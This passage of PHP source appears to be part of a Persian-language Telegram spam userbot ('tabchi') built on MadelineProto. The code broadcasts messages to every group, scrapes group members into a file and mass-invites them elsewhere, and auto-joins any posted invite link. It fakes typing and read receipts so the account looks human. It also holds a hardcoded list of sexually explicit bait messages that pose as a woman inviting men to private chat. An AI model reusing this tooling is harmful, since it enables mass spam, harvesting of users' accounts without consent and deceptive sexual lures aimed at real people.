              yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'⛓ درحال ارسال ...']);
              preg_match("/^[#\!\/](s2gps) (.*)$/", $msg, $text1);
              $text = $text1[2];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i=0;
              foreach ($dialogs as $peer) {
            	$type = yield $MadelineProto->get_info($peer);
            	$type3 = $type['type'];
            	if($type3 == "chat"){
            	  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"$text"]); 
            	  $i++;
            	}
              }
            		yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>"ارسال همگانی با موفقیت به گروه ها ارسال شد 👌🏻\n تعداد ارسال : $i"]);
            } */

            elseif ( preg_match( "/^[#\!\/](s2sgps) (.*)$/", $msg ) ) {
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
			  preg_match( "/^[#\!\/](s2sgps) (.*)$/", $msg, $text1 );
			  $text = $text1[ 2 ];
			  $dialogs = yield $MadelineProto->get_dialogs();
			  $i = 0;
			  foreach ( $dialogs as $peer ) {
				$type = yield $MadelineProto->get_info( $peer );
				$type3 = $type[ 'type' ];
				if ( $type3 == "supergroup" ) {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
				  $i++;
				}
			  }
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به سوپرگروه ها ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
            elseif ( $msg == '/delFtime' ) {
              foreach ( glob( "ForTime/*" ) as $files ) {
                unlink( "$files" );
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '➖ Removed !',
                'reply_to_msg_id' => $msg_id
              ] );
            }
            elseif ( $msg == 'delchs' || $msg == '/delchs' || $msg == 'Delchs' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $all = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'channel' ) {
                  $id = $type[ 'bot_api_id' ];
                  yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از همه ی کانال ها لفت دادم 👌\n تعداد لفت : $i", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(delgroups) (.*)$/i", $msg, $text );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $count = 0;
              $i = 0;
              $all = yield $MadelineProto->get_dialogs();
              foreach ( $all as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                  if ( $type3 == 'supergroup' || $type3 == 'chat' ) {
                    $id = $type[ 'bot_api_id' ];
                    if ( $chatID != $id ) {
                      yield $MadelineProto->channels->leaveChannel( [ 'channel' => $id ] );
                      $count++;
                      $i++;
                      if ( $count == $text[ 2 ] ) {
                        break;
                      }
                    }
                  }
                } catch ( Exception $m ) {}
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "از $i تا گروه لفت دادم 👌", 'reply_to_msg_id' => $msg_id ] );
            }
            elseif ( preg_match( "/^[\/\#\!]?(autochatpv) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autochatpv) (on|off)$/i", $msg, $m );
              $data[ 'autochatpv' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار پیوی روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار پیوی خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autochatgroup) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autochatgroup) (on|off)$/i", $msg, $m );
              $data[ 'autochatgroup' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار گروه روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت چت خودکار گروه خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinadmin) (on|off)$/i", $msg, $m );
              $data[ 'autojoinadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🤖 حالت جوین خودکار ادمین روشن شد ✅\nبا ارسال لینک گروه یا کانال ربات به طور خودکار اد میشود ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت جوین خودکار ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
			elseif ( preg_match( "/^[\/\#\!]?(autojoinall) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autojoinall) (on|off)$/i", $msg, $m );
              $data[ 'autojoinall' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🤖 حالت جوین خودکار همه روشن شد ✅\n هر کسی جز ادمین لینک گروه یا کانال ارسال کند تبچی عضو آن میشود. ", 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت جوین خودکار همه خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(autofadmin) (on|off)$/i", $msg, $m );
              $data[ 'autoforwardadmin' ][ 'on' ] = "$m[2]";
              file_put_contents( "data.json", json_encode( $data ) );
              if ( $m[ 2 ] == 'on' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین روشن شد ✅', 'reply_to_msg_id' => $msg_id ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🤖 حالت فوروارد خودکار به پیوی ادمین خاموش شد ❌', 'reply_to_msg_id' => $msg_id ] );
              }
            }
            elseif ( preg_match( "/^[\/\#\!]?(join) (.*)$/i", $msg ) ) {
              preg_match( "/^[\/\#\!]?(join) (.*)$/i", $msg, $text );
              $id = $text[ 2 ];
              try {
                yield $MadelineProto->channels->joinChannel( [ 'channel' => "$id" ] );
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '✅ Joined',
                  'reply_to_msg_id' => $msg_id
                ] );
              } catch ( Exception $e ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❗️<code>' . $e->getMessage() . '</code>',
                  'parse_mode' => 'html',
                  'reply_to_msg_id' => $msg_id
                ] );
              }
            }


 if(preg_match("/^[\/\#\!]?(SetId) (.*)$/i", $msg)){
 preg_match("/^[\/\#\!]?(SetId) (.*)$/i", $msg, $text);
  $id = $text[2];
  try {
  $User = yield $MadelineProto->account->updateUsername(['username' => "$id"]);
 } catch(Exception $v){
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message'=>'❗'.$v->getMessage()]);
 }
 $MadelineProto->messages->sendMessage([
    'peer' => $chatID,
    'message' =>"• نام کاربری جدید برای ربات تنظیم شد :
 @$id"]);
 }
if(preg_match("/^[\/\#\!]?(ست) (.*)$/i", $msg)){
 preg_match("/^[\/\#\!]?(ست) (.*)$/i", $msg, $text);
  $id = $text[2];
  try {
  $User = yield $MadelineProto->account->updateUsername(['username' => "$id"]);
 } catch(Exception $v){
$MadelineProto->messages->sendMessage(['peer' => $chatID,'message'=>'❗'.$v->getMessage()]);
 }
 $MadelineProto->messages->sendMessage([
    'peer' => $chatID,
    'message' =>"• نام کاربری جدید برای ربات تنظیم شد :
 @$id"]);
 }
 if (preg_match('/^\/?(بیوگرافی) (.*)$/ui', $msg, $text1)) {
$new = $text1[2];
yield $this->account->updateProfile(['about' => "$new"]);
yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "🔸بیوگرافی جدید تبچی: $new"]);
}
 if (preg_match('/^\/?(تنظیم اسم) (.*)$/ui', $msg, $text1)) {
$new = $text1[2];
yield $this->account->updateProfile(['first_name' => "$new"]);
yield $this->messages->sendMessage(['peer' => $chatID, 'message' => "🔸نام جدید : $new"]);
}
            elseif ( strpos( $msg, 'addpvs ' ) !== false ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => ' ⛓درحال ادد کردن ...' ] );
              $gpid = explode( 'addpvs ', $msg )[ 1 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == 'user' ) {
                  $pvid = $type[ 'user_id' ];
                  $MadelineProto->channels->inviteToChannel( [ 'channel' => $gpid, 'users' => [ $pvid ] ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "همه افرادی که در پیوی بودند را در گروه $gpid ادد کردم 👌🏻\n تعداد تلاش : $i " ] );
            }

            elseif ( preg_match( "/^[#\!\/](addall) (.*)$/", $msg ) ) {
              preg_match( "/^[#\!\/](addall) (.*)$/", $msg, $text1 );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید...',
                'reply_to_msg_id' => $msg_id
              ] );
              $user = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                try {
                  $type = yield $MadelineProto->get_info( $peer );
                  $type3 = $type[ 'type' ];
                } catch ( Exception $d ) {}
                if ( $type3 == 'supergroup' ) {
                  try {
                    yield $MadelineProto->channels->inviteToChannel( [ 'channel' => $peer, 'users' => [ "$user" ] ] );
                    $i++;
                  } catch ( Exception $d ) {}
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "کاربر **$user** توی همه ی ابرگروه ها ادد شد ✅ \n تعداد تلاش : $i ",
                'parse_mode' => 'MarkDown'
              ] );
            }
if (preg_match('/^عکس$/i', $msg, $mch)) {
if (isset($update['message']['reply_to_msg_id'])) {
$peer = $update['message']['to_id'];
$rp = $update['message']['reply_to_msg_id'];
$Chat = yield $this->getPwrChat($peer, false);
$type = $Chat['type'];
if (in_array($type, ['channel', 'supergroup'])) {
$messeg = yield $this->channels
->getMessages(['channel' => $peer, 'id' => [$rp], ]);
}else {$messeg = yield $this->messages->getMessages(['id' => [$rp], ]);}
if(isset($messeg['messages'][0]['media']['photo'])) {
$media = $messeg['messages'][0]['media'];
yield $this->photos->uploadProfilePhoto(['file' => $media, ]);
$text1 = "با موفقیت ثبت شد";}
else {$text1 = "باید در ریپلی به یک عکس ارسال شود";}}
else {$text1 = "باید در ریپلی به یک عکس ارسال شود";}
yield $this->messages->sendMessage(['peer' => $chatID, 'message' => $text1], ['FloodWaitLimit' => 0]);}
if($msg=="delphoto"||$msg=="حذف"){
$photo = yield $this->photos->getUserPhotos(['user_id' => yield $this->get_self()["id"], 'offset' => 0, 'max_id' => 0,'limit' => 1,]);
$inputPhoto = ['_'=>"inputPhoto",'id'=>$photo["photos"]["0"]["id"], 'access_hash'=>$photo["photos"]["0"]["access_hash"],'file_reference'=>"bytes"];
yield $this->photos->deletePhotos(['id' =>[$inputPhoto]]);
yield $this->messages->sendMessage(['peer'=>$chatID, 'message'=>"➣ باموفقیت حذف شد •"]);}
            elseif ( preg_match( "/^[#\!\/](setFtime) (.*)$/", $msg ) ) {
              if ( isset( $update[ 'message' ][ 'reply_to_msg_id' ] ) ) {
                if ( $type2 == 'supergroup' ) {
                  preg_match( "/^[#\!\/](setFtime) (.*)$/", $msg, $text1 );
                  if ( $text1[ 2 ] < 10 ) {
                    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '**❗️خطا: عدد وارد شده باید بیشتر از 30 دقیقه باشد.**', 'parse_mode' => 'MarkDown' ] );
                  } else {
                    $time = $text1[ 2 ] * 60;
                    if ( !is_dir( 'ForTime' ) ) {
                      mkdir( 'ForTime' );
                    }
                    file_put_contents( "ForTime/msgid.txt", $update[ 'message' ][ 'reply_to_msg_id' ] );
                    file_put_contents( "ForTime/chatid.txt", $chatID );
                    file_put_contents( "ForTime/time.txt", $time );
                    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ فروارد زماندار باموفقیت روی این پُست درهر $text1[2] دقیقه تنظیم شد.", 'reply_to_msg_id' => $update[ 'message' ][ 'reply_to_msg_id' ] ] );
                  }
                } else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
                }
              }
            }
			
			
			elseif(preg_match("/^[\/\#\!]?(خروج|left)$/i", $msg)){
			  $type = yield $this->get_info($chatID);
			  $type3 = $type['type'];
			  if($type3 == "supergroup"){
				yield $this->messages->sendMessage(['peer' => $chatID,'message' => "Bye!! :)"]);
				yield $this->channels->leaveChannel(['channel' => $chatID, ]);
			  }else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در سوپرگروه میباشد"]);
			  }
			}
			
			elseif($msg == 'delall' or $msg == 'پاکسازی کلی'){
			  if($type2 == "supergroup"||$type2 == "chat"){
				yield $this->messages->sendMessage([
				'peer' => $chatID,
				'reply_to_msg_id' => $msg_id,
				'message'=> "با موفقیت پاکسازی شد", 
				'parse_mode'=> 'markdown' ,
				]);
				$array = range($msg_id,1);
				$chunk = array_chunk($array,100);
				foreach($chunk as $v){
				  sleep(0.05);
				  yield $this->channels->deleteMessages([
				  'channel' =>$chatID,
				  'id' =>$v
				]);
				}
			  }
			  else{
				yield $this->messages->sendMessage(['peer' => $chatID,'reply_to_msg_id' => $msg_id ,'message' => "❗ این دستور مخصوص استفاده در گروه ها میباشد"]);
			  }
			}
			
			elseif ( preg_match( '/^\/?(export) (.*)$/ui', $msg, $text1 ) ) {
			  if ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "⛏ در حال استخراج ..." ] );
				$chat = yield $MadelineProto->getPwrChat( $text1[ 2 ] );
				$i = 0;
				foreach ( $chat[ 'participants' ] as $pars ) {
				  $id = $pars[ 'user' ][ 'id' ];
				  if ( !in_array( $id, $member[ 'list' ] ) ) {
					$member[ 'list' ][] = $id;
					file_put_contents( "member.json", json_encode( $member ) );
					$i++;
				  }
				  if ( $i == 1000 ) break;
				}
			    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ انجام شد. \n $i ممبر استخراج شد. \n اگر بیشتر میخواهید دوباره بفرستید." ] );
			  }
			  else{
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ اخطار : جهت استخراج اعضای گروه لطفا لینک گروه را بعد از export وارد کنید." ] );
			  }
			}
			
			elseif ( preg_match( '/^\/?(add) (.*)$/ui', $msg, $text1 ) ) {
			  if (! preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🔄 در حال اد کردن اعضای استخراج شده ..." ] );
				$gpid = $text1[ 2 ];
				if ( !file_exists( "$gpid.json" ) ) {
				  file_put_contents( "$gpid.json", '{"list":{}}' );
				}
				@$addmember = json_decode( file_get_contents( "$gpid.json" ), true );
				$c = 0;
				$add = 0;
				foreach ( $member[ 'list' ] as $id ) {
				  if ( !in_array( $id, $addmember[ 'list' ] ) ) {
					$addmember[ 'list' ][] = $id;
					file_put_contents( "$gpid.json", json_encode( $addmember ) );
					$c++;
					try {
					  yield $MadelineProto->channels->inviteToChannel( [ 'channel' => $gpid, 'users' => [ "$id" ] ] );
					  $add++;
					} catch ( danog\ MadelineProto\ RPCErrorException $e ) {
						if ( $e->getMessage() == "PEER_FLOOD" ) {
						  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "⛔ محدود شده اید" ] );
						  break;
						}
					}
				  }
				}
				unlink( "$gpid.json" );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ با موفقیت اد کرد.\n تعداد اعضای اد شده : $add \n تعداد تلاش : $c" ] );
			  }
			  else{
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ اخطار : جهت اد کردن اعضای استخراج شده ایدی گروه را بعد از add وارد کنید." ] );
			  }
			}
			
			elseif ( preg_match( '/^\/?(deletemember)$/ui', $msg ) ) {
			  $member[ 'list' ] = [];
			  file_put_contents( "member.json", json_encode( $member ) );
			  yield $this->messages->sendMessage( [ 'peer' => $chatID, 'message' => "🗑 اعضای استخراج شده حذف شدند." ] );
			}
			
			
			
			elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
              if ( @$data[ 'autojoinadmin' ][ 'on' ] == 'on' ) {
                preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
                $link = $l[ 0 ];
                try {
                  yield $MadelineProto->messages->importChatInvite( [
                    'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                  ] );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♻️عضو یک گروه شدم' ] );
                } catch ( \danog\ MadelineProto\ RPCErrorException $e ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                } catch ( \danog\ MadelineProto\ Exception $e2 ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❌ محدودیت عضو شدن!' ] );
                }
              }
            }
          }
		  
//===========================================================
		  elseif ( preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg ) ) {
            if ( @$data[ 'autojoinall' ][ 'on' ] == 'on' ) {
              preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $msg, $l );
              $link = $l[ 0 ];
              try {
                yield $MadelineProto->messages->importChatInvite( [
                  'hash' => str_replace( 'https://t.me/joinchat/', '', $link ),
                ] );
              }catch ( \danog\ MadelineProto\ RPCErrorException $e ) { }
               catch ( \danog\ MadelineProto\ Exception $e2 ) { }
            }
          }
          elseif(isset($update['message']['media']['_']) and $update['message']['media']['_'] == 'messageMediaContact' and !in_array($update['message']['media']['user_id'] , yield $this->contacts->getContactIDs())){
 $media = $update['message']['media'];
 yield $this->contacts->importContacts(['contacts' =>[['_' => 'inputPhoneContact', 'client_id' => 1, 'phone' => $media['phone_number'], 'first_name' => $media['first_name']]]]);
 $me = yield $this->getSelf();
 yield $this->messages->sendMedia(['peer' => $update, 'reply_to_msg_id' => $msg_id, 'media' => ['_' => 'inputMediaContact', 'phone_number' => $me['phone'], 'first_name' => $me['first_name']]]);
}
		  elseif ( $type2 == 'user' ) {
			if ( @$data[ 'autoforwardadmin' ][ 'on' ] == 'on') {
			  yield $MadelineProto->messages->forwardMessages( [ 'from_peer' => $userID, 'to_peer' => $admin, 'id' => [ $msg_id ] ] );
			}
			if ( @$data[ 'autochatpv' ][ 'on' ] == 'on') {
			  $files = glob( 'ans/pv/*' );
			  foreach ( $files as $file ) {
				if ( is_file( $file ) ) {
				  $file1 = str_replace( "ans/pv/", "", $file );
				  $filename = str_replace( ".txt", "", $file1 );
				  if ( strpos( $msg, $filename ) !== false ) {
					$file = fopen( $file, "r" );
					$i = 0;
					while ( !feof( $file ) ) {
						$arr[ $i ] = fgets( $file );
						$i++;
					}
					fclose( $file );
					$file1 = $arr[ rand( 0, $i - 2 ) ];
					yield $MadelineProto->sleep( 2 );
					yield $MadelineProto->messages->readHistory( [ 'peer' => $userID, 'max_id' => $msg_id ] );
					yield $MadelineProto->sleep( 2 );
					yield $MadelineProto->messages->setTyping( [ 'peer' => $chatID, 'action' => [ '_' => 'sendMessageTypingAction' ] ] );
					yield $MadelineProto->sleep( 1 );
					yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $file1, 'reply_to_msg_id' => $msg_id ] );
					break;
				  }
				}
			  }
				
			}
		  }
		  
		  elseif ( $type2 != 'channel' && @$data[ 'autochatgroup' ][ 'on' ] == 'on') { //&& rand(0, 10) == 1
			if ( file_exists( "ans/group/$msg.txt" ) ) {
			  $file = fopen( "ans/group/$msg.txt", "r" );
			  $i = 0;
			  while ( !feof( $file ) ) {
				$arr[ $i ] = fgets( $file );
				$i++;
			  }
			  fclose( $file );
			  $file1 = $arr[ rand( 0, $i - 2 ) ];
			  yield $MadelineProto->sleep( 1 );
			  yield $MadelineProto->messages->setTyping( [ 'peer' => $chatID, 'action' => [ '_' => 'sendMessageTypingAction' ] ] );
			  yield $MadelineProto->sleep( 1 );
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $file1, 'reply_to_msg_id' => $msg_id ] );
			}
		  }

 if ($type2 != 'channel' && @$data['autochat']['on'] == 'on' && rand(0, 2000) == 1) {
 yield $MadelineProto->sleep(4);

 if($type2 == 'user'){
  yield $MadelineProto->messages->readHistory(['peer' => $userID, 'max_id' => $msg_id]);
 yield $MadelineProto->sleep(2);
 }

yield $MadelineProto->messages->setTyping(['peer' => $chatID, 'action' => ['_' => 'sendMessageTypingAction']]);

$eagle = array('❄️اوف چ سکوتیه گروه 🕷🕷عنکبوت تو دهن گسی ک چت نکنه😐','🍂اهه😐','😂اوه یکی بیاد بلیسه منو','😐😐😐جوون😐','😕ناموسا اینارو نگا ','😎💄',':/','😂قلبم پاره پارس والا بوخودا❤️','🤦سالام🤦🏻‍♀🤦🏻‍♀','🚶🏻‍♀🚶🏻‍♀🚶🏻‍♀','🎈😐','شعت 🤐','سالام🥶دلام','سلوم','خوبین','کم چت کنین هنگم ه ه ه ه  🤦‍♂','اهه','سارام از تبریز خخخ','چن سالتونه اصل بدین','تبزیزی هس؟ ','اوف','💋💋','.','.','.','.','سالام من فقط سلام میکنم میرم مدیر منو مدیر کن تا نرم خخخ ','مدیر عاشقم شده ک بیا تی ویم خخخ','اخ درم قش رف براتو','اقا هست بیاد پیوی','یوی میخوام برام بلیسه😐','تنهام خیلی یعنی یکی نیست بیاد پیشم منو از تنهایی درم بیاره','منم دل دارم ازدواج کنم اخه چراشوهر گیرم نمیاد','پیوی نیایید😕','😎عاشق گردشم یه اقا بیاد بریم بیرون عشقو حال',':/','مادرم دوست داره با شوهرم ستایی حال کنیم یکی بیاد❤️','دنبال سکس سه نفره ایم نفر سوم بیاد منو مادرم و یک اقا','دوست دارم یکی برام بلیسه خارشک دارم🚶🏻‍♀','اونی ک ادعا میکنه بکنه بیاد بکنه مجانی حال میدم ببینم بلده جرم بده','شعت 🤐','خاک تو سرتون یکی نبود بیاد پیوی من  کم چت کنین خووو');
$texx = $eagle[rand(0, count($eagle) - 1)];
 yield $MadelineProto->sleep(1);
 yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => "$texx"]);
}
	  
          if ( file_exists( 'ForTime/time.txt' ) ) {
            if ( ( time() - filectime( 'ForTime/time.txt' ) ) >= file_get_contents( 'ForTime/time.txt' ) ) {
              $tt = file_get_contents( 'ForTime/time.txt' );
              unlink( 'ForTime/time.txt' );
              file_put_contents( 'ForTime/time.txt', $tt );
              $dialogs = yield $MadelineProto->get_dialogs();
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' || $type[ 'type' ] == 'chat' ) {
                  $MadelineProto->messages->forwardMessages( [ 'from_peer' => file_get_contents( 'ForTime/chatid.txt' ), 'to_peer' => $peer, 'id' => [ file_get_contents( 'ForTime/msgid.txt' ) ] ] );
                }
              }
            }
          }
          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => false, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }
          if ( $userID == $admin ) {
            if ( !file_exists( 'true' ) && file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 <= 4000 ) {
              file_put_contents( 'true', '' );
              yield $MadelineProto->sleep( 3 );
              copy( 'king.madeline', 'update-session/king.madeline' );
            }
          }
        }
      }
    } catch ( Exception $e ) {}
  }
}
register_shutdown_function( 'shutdown_function', $lock );
closeConnection();
$MadelineProto->async( true );
$MadelineProto->loop( function ()use( $MadelineProto ) {
  yield $MadelineProto->setEventHandler( '\EventHandler' );
} );
$MadelineProto->loop();
/*
malekeTABCHI : @ e_ror_off
channel TABCHI   : @Source_Dark
*/
